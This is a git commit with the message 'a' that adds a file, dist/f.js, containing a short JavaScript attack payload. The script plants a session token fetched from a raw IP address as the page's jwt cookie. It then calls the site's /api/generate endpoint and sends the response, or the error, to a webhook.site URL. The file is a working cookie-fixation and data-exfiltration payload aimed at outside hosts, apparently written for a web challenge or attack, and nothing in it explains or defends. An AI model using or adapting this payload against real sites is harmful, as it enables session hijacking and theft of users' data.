cd2c31c88dcf412663deb76a0ed51ccf748dcf6f
nyxmare <iam@nyxmare.world>
2023-09-10 13:31:42 +0700

    a

---
+++ dist/f.js
@@ -0,0 +1,10 @@
+c = ''
+document.cookie='jwt=';
+(await fetch('//23.94.107.138:1234/').then((r)=>{r.text().then( async (r)=> {
+    document.cookie = `jwt=${r.replace('\r', '').replace('\n', '')}; path=/`;
+    (await fetch('/api/generate').then((r)=>{r.text().then((r)=>{
+        navigator.sendBeacon('//webhook.site/49d5c423-d0fa-4795-8b37-0d2d38a020c0/?success', r)
+    }).catch((r)=>{
+        navigator.sendBeacon('//webhook.site/49d5c423-d0fa-4795-8b37-0d2d38a020c0/?success', r)
+    })}));
+})}));
